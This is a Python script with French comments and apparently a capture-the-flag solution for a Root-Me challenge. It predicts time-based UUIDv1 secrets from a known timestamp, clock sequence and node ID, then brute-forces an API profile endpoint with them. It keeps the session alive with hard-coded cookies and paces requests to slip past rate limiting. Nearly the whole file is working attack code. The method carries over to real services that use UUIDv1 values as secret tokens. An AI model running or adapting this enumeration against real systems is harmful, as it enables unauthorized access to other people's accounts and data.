import requests
import time
from datetime import datetime, timezone

# --- CONFIGURATION DE LA CIBLE ---
# On utilise la date avec le décalage d'une heure corrigé via timezone.utc
DATE_CIBLE = "2026-02-12 03:09:46.142229"
CLOCK_SEQ = "858a"
NODE_ID = "0242ac100019"
WINDOW = 5  # Nombre de ticks à tester autour de la cible (+/-)

# --- CONFIGURATION RÉSEAU ---
URL_BASE = "http://challenge01.root-me.org:59091/api/profile"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
    "Accept": "application/json",
}
# ATTENTION : Pense à mettre à jour ces cookies s'ils ont expiré (Erreur 403)
COOKIES = {
    "PHPSESSID": "32acf17f30a25ce8af441c9030cfc532",
    "session": ".eJwlzj0OwjAMQOG7eGZwnNhxepkq_olgbemEuDuVGJ_0hu8D-zryfML2Pq58wP4K2GDxYmturLm6I5owc1JN7FM8l6tqsSWTLUaT7lSQzWsUv5dq_a7OpSYNb1k9RFs3FtTJgaIxoo2KQzJKzklGtjSIqHl0zAI35Drz-GsqfH8ARC_H.aY2UbQ.tCp0AOuuI2J_smCONV51j90Px2M"
}

def exploit_final():
    # 1. Gestion du temps et correction du décalage
    # En forçant timezone.utc, on s'assure que le timestamp correspond à la structure de l'UUIDv1
    dt = datetime.strptime(DATE_CIBLE, "%Y-%m-%d %H:%M:%S.%f")
    dt = dt.replace(tzinfo=timezone.utc)
    unix_ts = dt.timestamp()
    
    # Offset RFC 4122 (15 oct 1582 -> 1er jan 1970)
    offset_rfc4122 = 12219292800
    base_uuid_ts = int((unix_ts + offset_rfc4122) * 10**7)

    print(f"[*] Analyse temporelle : {DATE_CIBLE} (UTC)")
    print(f"[*] Timestamp de base calculé : {base_uuid_ts}")
    print(f"[*] Mode stable activé (Pause de 0.4s entre les requêtes)\n")

    # 2. Initialisation de la session HTTP
    session = requests.Session()
    session.cookies.update(COOKIES)
    session.headers.update(HEADERS)

    # 3. Boucle de génération et de test
    for i in range(-WINDOW, WINDOW + 1):
        ts = base_uuid_ts + i
        ts_hex = f"{ts:015x}"
        
        # Reconstruction des champs de l'UUIDv1
        time_low = ts_hex[7:]
        time_mid = ts_hex[3:7]
        time_hi = ts_hex[:3]
        uuid_candidate = f"{time_low}-{time_mid}-1{time_hi}-{CLOCK_SEQ}-{NODE_ID}"

        try:
            # Envoi de la requête avec le paramètre 'secret'
            response = session.get(URL_BASE, params={"secret": uuid_candidate}, timeout=10)
            
            # Affichage en temps réel
            status = f"[ {response.status_code} ]" if response.status_code != 200 else "[ GAGNÉ ]"
            print(f"Index {i: >5} | {uuid_candidate} | {status}")

            if response.status_code == 200:
                print("\n" + "="*60)
                print(f" FLAG TROUVÉ à l'index {i} !")
                print(f" UUID : {uuid_candidate}")
                print(f" RÉPONSE : {response.text}")
                print("="*60)
                return

            # Pause cruciale pour éviter l'erreur 10054 (Rate Limiting)
            time.sleep(0.4)

        except (requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError):
            print(f"[!] Serveur saturé (Index {i}). Repos de 5s...")
            time.sleep(5)
            continue
        except Exception as e:
            print(f"\n[!] Erreur inattendue : {e}")
            break

    print("\n[-] Fin de la fenêtre. Vérifiez vos cookies ou augmentez la WINDOW.")

if __name__ == "__main__":
    exploit_final()